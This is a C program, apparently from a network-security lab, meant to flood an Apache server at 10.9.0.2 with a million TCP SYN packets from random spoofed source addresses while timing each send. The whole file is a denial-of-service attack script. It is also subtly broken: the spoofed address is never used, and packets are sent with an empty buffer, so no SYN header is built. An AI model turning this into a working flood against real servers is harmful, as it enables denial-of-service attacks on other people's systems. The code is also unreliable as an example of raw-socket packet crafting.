#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <time.h>

#define RUNS 1000000

// Function to generate a random IP address for the source of each SYN packet
char *randomIp() {
    static char ip[16];
    snprintf(ip, sizeof(ip), "%d.%d.%d.%d", rand()%256, rand()%256, rand()%256, rand()%256);
    return ip;
}

// Function to send SYN packets and log the time taken for each
void send_syn_packets(int sock, struct sockaddr_in *target, FILE *fp) {
    double total_time = 0.0;
    
    for (int i = 1; i < RUNS+1; i++) {
        if (i%10000 == 0)
        { 
            printf("At %d percent", i/10000); // Print progress every 10,000 packets
        } 
        clock_t start = clock();

        struct sockaddr_in src;
        memset(&src, 0, sizeof(src));
        src.sin_family = AF_INET;
        inet_pton(AF_INET, randomIp(), &src.sin_addr);
        sendto(sock, NULL, 0, 0, (struct sockaddr *) target, sizeof(*target));

        clock_t end = clock();
        double time_spent = (double)(end - start) / CLOCKS_PER_SEC;
        total_time += time_spent;

        // Log result to the file
        fprintf(fp, "Packet %d, Time: %f seconds\n", i, time_spent);
    }

        // Log the time taken for each packet
    fprintf(fp, "Total time to send all packets: %f seconds\n", total_time);
    fprintf(fp, "Average time per packet: %f seconds\n", total_time / RUNS);
}

int main() {
    srand(time(0));  // Seed the random number generator

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket error");
        exit(1);
    }

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(80);
    target.sin_addr.s_addr = inet_addr("10.9.0.2");  // Target Apache server IP

    // Open the result file
    FILE *fp = fopen("syns_results_c.txt", "w");
    if (fp == NULL) {
        perror("Error opening file");
        return 1;
    }

    send_syn_packets(sock, &target, fp);

    fclose(fp);
    close(sock);
    return 0;
}
